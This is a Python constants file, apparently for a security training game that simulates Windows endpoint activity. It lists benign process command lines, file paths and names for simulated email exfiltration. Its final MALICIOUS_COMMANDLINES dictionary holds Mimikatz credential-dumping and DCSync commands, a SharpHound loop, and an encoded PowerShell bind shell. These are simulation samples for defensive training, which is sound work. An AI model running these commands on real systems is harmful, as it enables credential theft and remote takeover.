from app.server.modules.endpoints.file_creation_event import File

# Constants related to email exfil
EMAIL_EXFIL_MAILBOX_FOLDER_NAMES = [
    "Inbox",
    "Drafts",
    "Sent Mail",
    "Deleted Mail",
    "Invoices",
    "Confidential",
    "Trade Deals"
]

EMAIL_EXFIL_OUTPUT_FILENAMES = [
    "contents",
    "email",
    "messages",
    "important"
]

EMAIL_EXFIL_OUTPUT_EXTENSIONS = [
    "7z",
    "zip",
    "rar",
    "gzip"
]

WEBSITE_STATIC_PATHS = [
    "home",
    "about",
    "contact",
    "covid19",
    "investor-relations",
    "about-us/history",
    "about-us/diversity",
    "faq",
    "about-us/leadership/executives",
    "careers",
    "careers/apply",
    "careers/company-culture",
    "careers/next-steps",
    "careers/internships",
    "careers/"
]

# common files on user comuters
COMMON_USER_FILE_LOCATIONS  = [
    "C:\\Users\\{username}\\Documents\\",
    "C:\\Users\\{username}\\Downloads\\",
    "C:\\Users\\{username}\\Pictures\\",
    "C:\\Users\\{username}\\Desktop\\",
    "C:\\Users\\{username}\\Videos\\",
    "C:\\Users\\{username}\Music\\"
]

# processes for creating files
FILE_CREATING_PROCESSES = [
    "chrome.exe",
    "Edge.exe",
    "7zip.exe",
    "explorer.exe",
    "OneDrive.exe",
    "dropbox.exe"
]

# Legit files users may install
LEGIT_EXECUTABLES_TO_INSTALL = [
    File(
        filename="chrome.exe",
        path="C:\\Program Files (x86)\\Google\\Chrome\\",
    ),
    File(
        filename="firefox.exe",
        path="C:\\Program Files\\Mozilla Firefox\\",
    ),

    File(
        filename="vlc.exe",
        path="C:\\Program Files\\VideoLAN\\VLC\\",
    ),

    File(
        filename="spotify.exe",
        path="C:\\Users\\{username}\\AppData\\Roaming\\Spotify\\",
    ),

    File(
        filename="discord.exe",
        path="C:\\Users\\{username}\\AppData\\Local\\Discord\\",
    ),

    File(
        filename="skype.exe",
        path="C:\\Program Files (x86)\\Microsoft\\Skype for Desktop\\",
    ),

    File(
        filename="zoom.exe",
        path="C:\\Users\\{username}\\AppData\\Roaming\\Zoom\\bin\\",
    ),

    File(
        filename="steam.exe",
        path="C:\\Program Files (x86)\\Steam\\",
    ),

    File(
        filename="winrar.exe",
        path="C:\\Program Files\\WinRAR\\",
    ),

    File(
        filename="notepad++.exe",
        path="C:\\Program Files\\Notepad++\\",
    ),

    File(
        filename="audacity.exe",
        path="C:\\Program Files (x86)\\Audacity\\",
    ),

    File(
        filename="pythonw.exe",
        path="C:\\Users\\{username}\\AppData\\Local\\Programs\\Python\\Python39\\",
    ),

    File(
        filename="java.exe",
        path="C:\\Program Files\\Java\\jdk-11.0.10\\bin\\",
    ),

    File(
        filename="gimp-2.10.exe",
        path="C:\\Program Files\\GIMP 2\\bin\\",
    )
]

# Legit system processes

LEGIT_SYSTEM_COMMANDLINES = ['C:\\Windows\\System32\\smss.exe',
'C:\\Windows\\system32\\csrss.exe ObjectDirectory=\\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16',
'wininit.exe',
'C:\\Windows\\system32\\services.exe',
'C:\\Windows\\system32\\lsass.exe',
'C:\\Windows\\system32\\svchost.exe -k DcomLaunch',
'C:\\Windows\\system32\\svchost.exe -k RPCSS',
'C:\\Windows\\system32\\svchost.exe -k netsvcs',
'C:\\Windows\\system32\\svchost.exe -k LocalSystemNetworkRestricted',
'C:\\Windows\\system32\\svchost.exe -k LocalService',
'C:\\Windows\\system32\\svchost.exe -k LocalServiceAndNoImpersonation',
'C:\\Windows\\system32\\svchost.exe -k LocalServiceNetworkRestricted',
'C:\\Windows\\system32\\svchost.exe -k NetworkService',
'C:\\Windows\\system32\\svchost.exe -k LocalServiceNoNetwork',
'C:\\Windows\\System32\\spoolsv.exe',
'C:\\Windows\\System32\\GRR\\3.2.0.1\\GRRservice.exe --service_key "Software\\GRR"',
'C:\\Windows\\System32\\svchost.exe -k utcsvc',
'C:\\Windows\\Sysmon.exe',
'C:\\Windows\\system32\\svchost.exe -k appmodel',
'"C:\\Program Files\\winlogbeat-6.0.0-windows-x86_64\\\\winlogbeat.exe" -c "C:\\Program Files\\winlogbeat-6.0.0-windows-x86_64\\\\winlogbeat.yml" -path.home "C:\\Program Files\\winlogbeat-6.0.0-windows-x86_64" -path.data "C:\\\\ProgramData\\\\winlogbeat" -path.logs "C:\\\\ProgramData\\\\winlogbeat\\logs"',
'"C:\\Program Files\\Windows Defender\\MsMpEng.exe"',
'C:\\\\Windows\\\\System32\\\\GRR\\\\3.2.0.1\\\\GRR.exe --config "C:\\\\Windows\\\\System32\\\\GRR\\\\3.2.0.1\\\\GRR.exe.yaml"',
'C:\\Windows\\system32\\dllhost.exe /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235}',
'C:\\Windows\\System32\\msdtc.exe',
'C:\\Windows\\system32\\wbem\\unsecapp.exe -Embedding',
'"C:\\Program Files\\Windows Defender\\NisSrv.exe"',
'C:\\Windows\\system32\\SearchIndexer.exe /Embedding',
'"C:\\Program Files\\Common Files\\Microsoft Shared\\OfficeSoftwareProtectionPlatform\\OSPPSVC.EXE"',
'C:\\Windows\\system32\\csrss.exe ObjectDirectory=\\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16',
'winlogon.exe',
'"dwm.exe"',
'sihost.exe',
'taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E}',
'"C:\\Windows\\SystemApps\\ShellExperienceHost_cw5n1h2txyewy\\ShellExperienceHost.exe" -ServerName:App.AppXtk181tbxbce2qsex02s8tw7hfxa9xb3t.mca',
'C:\\Windows\\system32\\ApplicationFrameHost.exe -Embedding',
'C:\\Windows\\system32\\svchost.exe -k UnistackSvcGroup',
'"C:\\Program Files\\WindowsApps\\Microsoft.Messaging_2.15.20002.0_x86__8wekyb3d8bbwe\\SkypeHost.exe" -ServerName:SkypeHost.ServerServer',
'"C:\\Program Files\\WindowsApps\\Microsoft.WindowsStore_2015.10.13.0_x64__8wekyb3d8bbwe\\WinStore.Mobile.exe" -ServerName:App.AppXqagq4n4gvy0tjw576pgh6xr601s1h1mv.mca',
'"C:\\Program Files\\Windows Defender\\MpCmdRun.exe" SpyNetServiceDss -RestrictPrivileges -AccessKey 2DA53DC1-2D6D-CE26-E61E-499F9AD425AF -Reinvoke',
'"C:\\Windows\\SystemApps\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\SearchUI.exe" -ServerName:CortanaUI.AppXa50dqqa5gqv4a428c9y1jjw7m3btvepj.mca',
'"LogonUI.exe" /flags:0x0 /state0:0xa31ff055 /state1:0x41c64e6d',
'C:\\Windows\\System32\\LockAppHost.exe -Embedding',
'"C:\\Windows\\SystemApps\\Microsoft.LockApp_cw5n1h2txyewy\\LockApp.exe" -ServerName:WindowsDefaultLockScreen.AppX7y4nbzq37zn4ks9k7amqjywdat7d3j2z.mca',
'%SystemRoot%\\system32\\csrss.exe ObjectDirectory=\\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16',
'C:\\Windows\\System32\\WinLogon.exe -UserSwitch S-1-5-21-279459042-186945023-3367459056-1113',
'"dwm.exe"',
'sihost.exe',
'taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E}',
'C:\\Windows\\system32\\svchost.exe -k UnistackSvcGroup',
'"C:\\Windows\\system32\\SearchProtocolHost.exe" Global\\UsGthrFltPipeMssGthrPipe422_ Global\\UsGthrCtrlFltPipeMssGthrPipe422 1 -2147483646 "Software\\Microsoft\\Windows Search" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)" "C:\\ProgramData\\Microsoft\\Search\\Data\\Temp\\usgthrsvc" "DownLevelDaemon" ',
'"C:\\Windows\\system32\\SearchFilterHost.exe" 0 624 628 636 8192 632 ',
'C:\\Windows\\system32\\wbem\\wmiprvse.exe',
'C:\\Windows\\system32\\sppsvc.exe',
'"C:\\Windows\\system32\\BackgroundTaskHost.exe" -ServerName:BackgroundTaskHost.WebAccountProvider',
'C:\\Windows\\system32\\svchost.exe -k wsappx -p -s AppXSvc',
'"C:\\Windows\\System32\\SearchProtocolHost.exe" Global\\UsGthrFltPipeMssGthrPipe38_ Global\\UsGthrCtrlFltPipeMssGthrPipe38 1 -2147483646 ',
'C:\\Windows\\system32\\SearchIndexer.exe /Embedding',
'C:\\Windows\\system32\\wbem\\unsecapp.exe -Embedding ',
'C:\\Windows\\Sysmon64.exe',
'C:\\Windows\\System32\\svchost.exe -k AppReadiness',
'"C:\\Program Files\\WindowsApps\\Microsoft.BingFinance_4.6.169.0_x86__8wekyb3d8bbwe\\Microsoft.Msn.Money.exe" -ServerName:AppexFinance.AppX6tep37frvzednpfqt02kdykt0ydv37zc.mca',
'taskhostw.exe',
'consent.exe 7196 468 000002899A73D640',
'C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Appinfo',
'"C:\\Program Files\\Microsoft OneDrive\\22.191.0911.0001\\FileCoAuth.exe" -Embedding',
'C:\\Windows\\System32\\svchost.exe -k wsappx -p -s ClipSVC',
'"C:\\Windows\\system32\\DllHost.exe" /Processid:{5250E46F-BB09-D602-5891-F476DC89B700}',
'C:\\Windows\\system32\\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}',
'"C:\\Windows\\System32\\SearchProtocolHost.exe" Global\\UsGthrFltPipeMssGthrPipe37_ Global\\UsGthrCtrlFltPipeMssGthrPipe37 1 -2147483646 ',
'C:\\Windows\\system32\\dmclient.exe utcwnf',
'C:\\Windows\\system32\\wermgr.exe -upload',
'C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule',
'"C:\\Windows\\system32\\DllHost.exe" /Processid:{9F156763-7844-4DC4-B2B1-901F640F5155}',
'"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\103.0.1264.77\\identity_helper.exe" --type=utility ',
'"C:\\Windows\\system32\\SearchFilterHost.exe" 828 3048 3080 812 {85EE815A-7738-4808-A14A-3AD87E32A3BF}',
'"C:\\Windows\\System32\\SearchProtocolHost.exe" Global\\UsGthrFltPipeMssGthrPipe36_ Global\\UsGthrCtrlFltPipeMssGthrPipe36 1 -2147483646 ',
'"C:\\Program Files\\Microsoft Office\\root\\Office16\\sdxhelper.exe" /onlogon',
'"C:\\Program Files\\Microsoft Office\\Root\\Office16\\SDXHelper.exe" -Embedding',
'"C:\\Windows\\System32\\SearchProtocolHost.exe" Global\\UsGthrFltPipeMssGthrPipe_S-1-5-21-2449965632-1733627164-4233550561-100135_ ',
'C:\\Windows\\system32\\AUDIODG.EXE 0x000000000000047C 0x0000000000000534',
'C:\\Windows\\System32\\svchost.exe -k LocalServiceNetworkRestricted -p',
'\\\\?\\C:\\Windows\\System32\\SecurityHealthHost.exe {08728914-3F57-4D52-9E31-49DAECA5A80A} -Embedding',
'taskhostw.exe -RegisterDevice -ProtectionStateChanged -FreeNetworkOnly',
'C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s BITS',
'"c:\\windows\\system32\\\\svchost.exe"',
'"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2205.7-0\\MsMpEng.exe"',
'C:\\Windows\\system32\\svchost.exe -k WbioSvcGroup -s WbioSrvc',
'\\\\?\\C:\\Windows\\System32\\SecurityHealthHost.exe {E041C90B-68BA-42C9-991E-477B73A75C90} -Embedding',
'"C:\\Program Files\\WindowsApps\\Microsoft.SecHealthUI_1000.22000.1.0_neutral__8wekyb3d8bbwe\\SecHealthUI.exe" ',
'C:\\Windows\\system32\\DllHost.exe /Processid:{45BA127D-10A8-46EA-8AB7-56EA9078943C}',
'"C:\\Program Files\\WindowsApps\\Microsoft.GamingApp_2207.1001.6.0_x64__8wekyb3d8bbwe\\XboxAppServices.exe" -Embedding',
'"C:\\Program Files\\WindowsApps\\Microsoft.GamingApp_2207.1001.6.0_x64__8wekyb3d8bbwe\\XboxPcApp.exe" ',
'C:\\Windows\\System32\\wuapihost.exe -Embedding',
'"C:\\Program Files\\WindowsApps\\Microsoft.XboxGamingOverlay_5.822.6271.0_x64__8wekyb3d8bbwe\\GameBarFTServer.exe" -Embedding',
'"C:\\Program Files\\WindowsApps\\Microsoft.XboxGamingOverlay_5.822.6271.0_x64__8wekyb3d8bbwe\\GameBar.exe" ',
'C:\\Windows\\system32\\DllHost.exe /Processid:{7966B4D8-4FDC-4126-A10B-39A3209AD251}',
'"C:\\Program ',
'sihost.exe',
'C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s XblAuthManager',
'"C:\\Program Files\\WindowsApps\\Microsoft.WindowsStore_22205.1401.13.0_x64__8wekyb3d8bbwe\\WinStore.App.exe" ',
'"C:\\Windows\\system32\\backgroundTaskHost.exe" -ServerName:App.AppXe9cvj1thv1hmcw0cs98xm3r97tyzy2xs.mca',
'%%systemroot%%\\system32\\MoNotificationUx.exe /ClearActiveNotifications',
'C:\\Windows\\uus\\AMD64\\MoUsoCoreWorker.exe',
'C:\\Windows\\system32\\svchost.exe -k wusvcs -p -s WaaSMedicSvc',
'"C:\\Windows\\system32\\backgroundTaskHost.exe" -ServerName:Microsoft.MicrosoftOfficeHub.AppX54h2e8jwdm50fj5ha8987vz1etpx7czd.mca',
'"C:\\Windows\\system32\\backgroundTaskHost.exe" -ServerName:Global.Accounts.AppXqe94epy97qwa6w3j6w132e8zvcs117nd.mca',
'taskhostw.exe -RegisterUserDevice -NewAccount',
'C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s NetSetupSvc',
'C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding',
'"C:\\Program Files\\NVIDIA Corporation\\NVIDIA Geforce Experience\\NVIDIA Notification.exe" --type=renderer --no-sandbox ',
'"C:\\Program Files\\NVIDIA Corporation\\NVIDIA Geforce Experience\\NVIDIA Notification.exe" --url-route=#/driverNotification ',
'"C:\\Program Files\\NVIDIA Corporation\\NvContainer\\nvcontainer.exe" -f "C:\\ProgramData\\NVIDIA\\NvContainerUser%d.log" -d ',
'C:\\Windows\\system32\\services.exe'
]

LEGIT_SYSTEM_PARENT_PROCESSES={
    "services.exe":"c3c259ae4640cded730676a6956bafea4f9bf20ed460a61c62c7c516090551b6"
}

LEGIT_USER_COMMANDLINES = [
'C:\\Program Files\\winword.exe -embedding',
'C:\\Windows\\System32\\cmd.exe nslookup google.com',
'C:\\Windows\\explorer.exe explorer',
'C:\\Windows\\System32\\powershell.exe -Nop -ExecutionPolicy bypass -enc SW52b2tlLVdtaU1ldGhvZCAtQ29tcHV0ZXJOYW1lICRTZXJ2ZXIgLUNsYXNzIENDTV9Tb2Z0d2FyZVVwZGF0ZXNNYW5hZ2VyIC1OYW1lIEluc3RhbGxVcGRhdGVzIC0gQXJndW1lbnRMaXN0ICgsICRQZW5kaW5nVXBkYXRlTGlzdCkgLU5hbWVzcGFjZSByb290WyZjY20mXWNsaWVudHNkayB8IE91dC1OdWxs"',
'C:\\Windows\\System32\\powershell.exe powershell Get-WmiObject -Class Win32_NetworkAdapterConfiguration',
'"C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe"',
'"C:\\Program Files\\VMware\\VMware Tools\\VMware VGAuth\\VGAuthService.exe"',
'C:\\Windows\\Explorer.EXE',
'C:\\Windows\\System32\\RuntimeBroker.exe -Embedding',
'"C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe" -n vmusr',
'"C:\\Users\\{username}\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe" /background',
'"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe" ',
'"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe" --type=watcher --main-thread-id=5920 --on-initialized-event-handle=536 --parent-handle=540 /prefetch:6',
'"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe" --type=gpu-process --field-trial-handle=2216,3522914129815752691,3416324942297142380,131072 --use-gl=swiftshader-webgl --disable-accelerated-video-decode --gpu-vendor-id=0x15ad --gpu-device-id=0x0405 --gpu-driver-vendor="Google Inc." --gpu-driver-version=3.3.0.2 --gpu-driver-date=2017/04/07 --service-request-channel-token=DEAED0A0CC26E9308A38E9DBC842EF6C --mojo-platform-channel-handle=6400 --ignored=" --type=renderer " /prefetch:2',
'"C:\\Program Files (x86)\\Microsoft Office\\Office14\\OUTLOOK.EXE" ',
'"C:\\Program Files\\WindowsApps\\Microsoft.BingWeather_4.20.1102.0_x64__8wekyb3d8bbwe\\Microsoft.Msn.Weather.exe" -ServerName:App.AppX2m6wj6jceb8yq7ppx1b3drf7yy51ha6f.mca',
'"C:\\Windows\\SystemApps\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\MicrosoftEdge.exe" -ServerName:MicrosoftEdge.AppXdnhjhccw3zf0j06tkg3jtqr00qdm0khc.mca',
'C:\\Windows\\system32\\browser_broker.exe -Embedding',
'"C:\\Windows\\SystemApps\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\microsoftedgecp.exe" SCODEF:2500 CREDAT:140545 EDGEHOST  /prefetch:6',
'"C:\\Windows\\SystemApps\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\microsoftedgecp.exe" SCODEF:2500 CREDAT:206085 EDGEHOST  /prefetch:6',
'"C:\\Program Files\\WindowsApps\\king.com.CandyCrushSodaSaga_1.104.700.0_x86__kgqvnymyfvs32\\stritz.exe" -ServerName:App.AppXyy7gex6h953pybd77fmw6bne5r5qrsf1.mca',
'C:\\Windows\\Explorer.EXE',
'C:\\Windows\\System32\\RuntimeBroker.exe -Embedding',
'"C:\\Windows\\SystemApps\\ShellExperienceHost_cw5n1h2txyewy\\ShellExperienceHost.exe" -ServerName:App.AppXtk181tbxbce2qsex02s8tw7hfxa9xb3t.mca',
'"C:\\Windows\\SystemApps\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\SearchUI.exe" -ServerName:CortanaUI.AppXa50dqqa5gqv4a428c9y1jjw7m3btvepj.mca',
'"C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe" -n vmusr',
'C:\\Windows\\system32\\conhost.exe 0x4',
'"C:\\Users\\{username}\\Desktop\\Response\\DumpIt.exe" ',
'C:\\Windows\\system32\\conhost.exe 0x4',
'"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE" ',
'C:\\Windows\\Explorer.EXE',
'"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe" --type=utility ',
'"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe" --profile-directory=Default',
'"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe" --type=renderer --disable-client-side-phishing-detection ',
'"C:\\Program Files\\Microsoft Office\\Root\\Office16\\EXCEL.EXE" "C:\\Users\\{username}\\Downloads\\{filename}"',
'\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1',
'"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" ',
'"C:\\Program Files\\WindowsApps\\Microsoft.WindowsNotepad_11.2205.11.0_x64__8wekyb3d8bbwe\\Notepad\\Notepad.exe" ',
'C:\\Windows\\system32\\OpenWith.exe -Embedding',
'"C:\\Windows\\system32\\mmc.exe" "C:\\Windows\\system32\\eventvwr.msc" /s',
'consent.exe 7196 426 0000028999E22E30',
'"C:\\Program Files\\Microsoft Office\\Root\\Office16\\EXCEL.EXE" "C:\\Users\\{username}\\OneDrive\\Desktop\\{filename}"',
'C:\\Windows\\System32\\RuntimeBroker.exe -Embedding',
'"C:\\Program Files\\WindowsApps\\MicrosoftTeams_22183.300.1431.9295_x64__8wekyb3d8bbwe\\msteamsupdate.exe" -RegisterComServerForEcsTask ',
'"C:\\Program Files (x86)\\Microsoft\\EdgeWebView\\Application\\103.0.1264.77\\msedgewebview2.exe" --type=utility ',
'"C:\\Program Files (x86)\\Microsoft\\EdgeWebView\\Application\\103.0.1264.77\\msedgewebview2.exe" --embedded-browser-webview=1 ',
'"C:\\Program Files\\WindowsApps\\SpotifyAB.SpotifyMusic_1.190.859.0_x86__zpdnekdrzrea0\\Spotify.exe" --type=gpu-process ',
'Spotify.exe',
'"C:\\Users\\{username}\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe" --type=gpu-process ',
'"C:\\Users\\{username}\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe"',
'"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe" --type=utility --utility-sub-type=audio.mojom.AudioService ',
'"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe" --type=gpu-process --disable-gpu-sandbox --use-gl=disabled ',
'"C:\\Program Files (x86)\\Microsoft\\EdgeWebView\\Application\\103.0.1264.77\\msedgewebview2.exe" --type=gpu-process --disable-gpu-sandbox ',
'consent.exe 7196 426 000002899A728910',
'"C:\\Windows\\regedit.exe" ',
'consent.exe 7196 258 0000028999EC09C0',
'C:\\Windows\\System32\\oobe\\UserOOBEBroker.exe -Embedding',
'"C:\\Windows\\ImmersiveControlPanel\\SystemSettings.exe" -ServerName:microsoft.windows.immersivecontrolpanel',
'"C:\\Windows\\System32\\SearchProtocolHost.exe" Global\\UsGthrFltPipeMssGthrPipe_S-1-5-21-2449965632-1733627164-4233550561-100134_ ',
'"C:\\Program Files\\Microsoft Office\\Root\\Office16\\WINWORD.EXE" /n "C:\\Users\\{username}\\Downloads\\{filename}" /o ""',
'C:\\Windows\\System32\\rundll32.exe shell32.dll,SHCreateLocalServerRunDll {c82192ee-6cb5-4bc0-9ef0-fb818773790a} -Embedding',
'C:\\Windows\\system32\\AppHostRegistrationVerifier.exe',
'"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE" ',
'"C:\\Program Files\\WindowsApps\\SpotifyAB.SpotifyMusic_1.190.859.0_x86__zpdnekdrzrea0\\Spotify.exe" --type=utility ',
'"C:\\Program Files\\WindowsApps\\SpotifyAB.SpotifyMusic_1.190.859.0_x86__zpdnekdrzrea0\\Spotify.exe" --type=renderer ',
'C:\\Windows\\System32\\CompPkgSrv.exe -Embedding',
'"C:\\Program Files\\WindowsApps\\SpotifyAB.SpotifyMusic_1.190.859.0_x86__zpdnekdrzrea0\\Spotify.exe" --type=gpu-process --disable-d3d11 ',
'"C:\\Program Files\\WindowsApps\\SpotifyAB.SpotifyMusic_1.190.859.0_x86__zpdnekdrzrea0\\Spotify.exe" --type=crashpad-handler /prefetch:7 ',
'"C:\\Program Files\\WindowsApps\\SpotifyAB.SpotifyMusic_1.190.859.0_x86__zpdnekdrzrea0\\SpotifyMigrator.exe" ',
'"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe" --type=utility --utility-sub-type=chrome.mojom.UtilWin --lang=en-US ',
'"C:\\Windows\\SystemApps\\Microsoft.AAD.BrokerPlugin_cw5n1h2txyewy\\Microsoft.AAD.BrokerPlugin.exe" ',
'C:\\Windows\\system32\\ApplicationFrameHost.exe -Embedding',
'"C:\\Users\\{username}\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe" --type=utility --utility-sub-type=audio.mojom.AudioService ',
'"C:\\Users\\{username}\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe" --type=renderer --autoplay-policy=no-user-gesture-required ',
'"C:\\Users\\{username}\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe" --type=utility --utility-sub-type=network.mojom.NetworkService ',
'"C:\\Users\\{username}\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe" --type=relauncher --no-sandbox --- ',
'"C:\\Users\\{username}\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe" --system-initiated',
'C:\\Windows\\System32\\LocationNotificationWindows.exe',
'"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe" --type=utility --utility-sub-type=asset_store.mojom.AssetStoreService ',
'C:\\Windows\\system32\\svchost.exe -k DcomLaunch -p',
'"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe" --type=renderer --extension-process ',
'"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe" --type=utility --utility-sub-type=storage.mojom.StorageService ',
'"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe" --type=utility --utility-sub-type=network.mojom.NetworkService ',
'"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe" --type=gpu-process --gpu-preferences=UAAAAAAAAADgAAAYAAAAAAAAAAAAAAAAAA',
'"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe" --type=crashpad-handler ',
'"C:\\Program Files (x86)\\Microsoft\\EdgeWebView\\Application\\103.0.1264.77\\msedgewebview2.exe" --type=renderer --noerrdialogs ',
'"C:\\Program Files (x86)\\Microsoft\\EdgeWebView\\Application\\103.0.1264.77\\msedgewebview2.exe" --type=gpu-process --noerrdialogs ',
'"C:\\Program Files\\WindowsApps\\MicrosoftTeams_22183.300.1431.9295_x64__8wekyb3d8bbwe\\msteamsupdate.exe" -CheckUpdate -AppSessionGUID ',
'"C:\\Program Files\\WindowsApps\\MicrosoftTeams_22183.300.1431.9295_x64__8wekyb3d8bbwe\\msteams.exe" ms-teams:system-initiated ',
'"C:\\Program Files (x86)\\Microsoft\\EdgeWebView\\Application\\103.0.1264.77\\msedgewebview2.exe" --type=crashpad-handler ',
'"C:\\Program Files\\WindowsApps\\MicrosoftTeams_22183.300.1431.9295_x64__8wekyb3d8bbwe\\msteams.exe" ms-teams:system-initiated'
]

LEGIT_PARENT_PROCESSES={
    "cmd.exe":"ff79d3c4a0b7eb191783c323ab8363ebd1fd10be58d8bcc96b07067743ca81d5",
    "explorer.exe":"0327b7630d585ad01f6ec2eb847622645b81df94a1370b5e466db9f09f933951",
    "cmd.exe":"614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f",
    "sc.exe":"4fe6d9eb8109fb79ff645138de7cff37906867aade589bd68afa503a9ab3cfb2",
    "powershell.exe": "529ee9d30eef7e331b24e66d68205ab4554b6eb3487193d53ed3a840ca7dde5d"
}

MALICIOUS_COMMANDLINES={
	"mimikatz.exe":"sekurlsa::logonpasswords",
	"powershell.exe":"powershell -nop -w hidden -enc d2hvYW1p",
	"mimikatz.exe":"lsadump::dcsync /user:domain\krbtgt /domain:lab.local", #Does our game have a company name variant to add here instead of "lab"
	"sharphound.exe":"SharpHound.exe --CollectionMethods Session --Loop",
    "powershell.exe": "-nop -enc IyRsaXN0ZW5lciA9IFtTeXN0ZW0uTmV0LlNvY2tldHMuVGNwTGlzdGVuZXJdNDQzOyRsaXN0ZW5lci5zdGFy" +
    "dCgpOyRjbGllbnQgPSAkbGlzdGVuZXIuQWNjZXB0VGNwQ2xpZW50KCk7JHN0cmVhbSA9ICRjbGllbnQuR2V0U3RyZWFtKCk7W2J5dGV" +
    "bXV0kYnl0ZXMgPSAwLi42NTUzNXwlezB9O3doaWxlKCgkaSA9ICRzdHJlYW0uUmVhZCgkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpKSA" +
    "tbmUgMCl7OyRkYXRhID0gKE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5UZXh0LkFTQ0lJRW5jb2RpbmcpLkdldFN0cmluZygkYnl" +
    "0ZXMsMCwgJGkpOyRzZW5kYmFjayA9IChpZXggJGRhdGEgMj4mMSB8IE91dC1TdHJpbmcgKTskc2VuZGJhY2syICA9ICRzZW5kYmFjayA" +
    "rICJQUyAiICsgKHB3ZCkuUGF0aCArICI+ICI7JHNlbmRieXRlID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRzZW5" +
    "kYmFjazIpOyRzdHJlYW0uV3JpdGUoJHNlbmRieXRlLDAsJHNlbmRieXRlLkxlbmd0aCk7JHN0cmVhbS5GbHVzaCgpfTskY2xpZW50LkN" +
    "sb3NlKCk7JGxpc3RlbmVyLlN0b3AoKQ=="
}